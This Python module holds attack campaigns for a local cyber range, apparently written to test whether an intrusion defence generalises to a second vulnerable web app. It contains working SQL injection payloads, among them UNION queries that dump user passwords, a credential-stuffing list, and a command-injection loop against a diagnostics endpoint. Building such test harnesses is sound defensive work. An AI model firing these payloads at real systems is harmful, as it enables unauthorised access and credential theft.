"""Attack campaigns for BookNook (the second target): sqli, command_injection, credential_stuffing.

Same attacker model as range/attacks/ (one Actor = one identity, spoofed browser UA, local range
only), pointed at different endpoints with different parameter names, so a defence tuned on
Juice Shop has to generalise. Each campaign returns {objective_met, evidence}.
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "range" / "attacks"))
from client import Actor        # noqa: E402,F401
import campaigns as JS          # noqa: E402  (payload lists + user agent only)

SQLI_LOGIN = JS.SQLI_LOGIN
CMDI = JS.CMDI
UNION = ["zzz' UNION SELECT id,email,password,0 FROM users--",
         "zzz' UNION SELECT 1,email,password,3 FROM users-- -",
         "x') OR 1=1--"]
CREDS = [("admin@booknook.test", "123456"), ("admin@booknook.test", "password"),
         ("jim@booknook.test", "letmein"), ("ada@booknook.test", "qwerty"),
         ("bender@booknook.test", "OhGod10%close"), ("admin@booknook.test", "admin123"),
         ("jim@booknook.test", "ncc-1701"), ("ada@booknook.test", "Tr1cky!pass"),
         ("admin@booknook.test", "welcome"), ("bender@booknook.test", "iloveyou")]


def sqli(a, pace: float) -> dict:
    a.fire("GET", "/", stage="recon", technique="landing", malicious=False)
    met, ev = False, ""
    for p in SQLI_LOGIN:
        r = a.fire("POST", "/api/login", stage="exploit", technique="sqli-auth-bypass",
                   json_body={"email": p, "password": "x"})
        if r.status == 200 and "token" in r.body:
            met, ev = True, "auth bypass via SQLi login"
        time.sleep(pace)
    for p in UNION:
        r = a.fire("GET", "/api/books", stage="exfil", technique="sqli-union", params={"q": p})
        if r.status == 200 and "admin123" in r.body:
            met, ev = True, ev or "union extraction returned password column"
        time.sleep(pace)
    return {"objective": "bypass auth / dump users", "objective_met": met, "evidence": ev}


def command_injection(a, pace: float) -> dict:
    a.fire("GET", "/", stage="recon", technique="landing", malicious=False)
    met = False
    for p in CMDI:
        r = a.fire("GET", "/api/diagnostics", stage="exploit", technique="cmdi-diagnostics",
                   params={"host": "localhost" + p})
        if r.status == 200 and "uid=" in r.body:
            met = True
        time.sleep(pace)
    return {"objective": "execute OS commands", "objective_met": met,
            "evidence": "command output in response" if met else ""}


def credential_stuffing(a, pace: float) -> dict:
    a.fire("GET", "/", stage="recon", technique="landing", malicious=False)
    hits = []
    for e, p in CREDS:
        r = a.fire("POST", "/api/login", stage="exploit", technique="cred-stuffing",
                   json_body={"email": e, "password": p})
        if r.status == 200 and "token" in r.body:
            hits.append(e)
        time.sleep(pace * 0.5)
    return {"objective": "find valid credentials", "objective_met": bool(hits),
            "evidence": f"valid: {hits}" if hits else ""}


CAMPAIGNS = {"sqli": sqli, "command_injection": command_injection,
             "credential_stuffing": credential_stuffing}


def user_agent_for(campaign: str, mode: str = "browser") -> str:
    return JS.BROWSER_UA
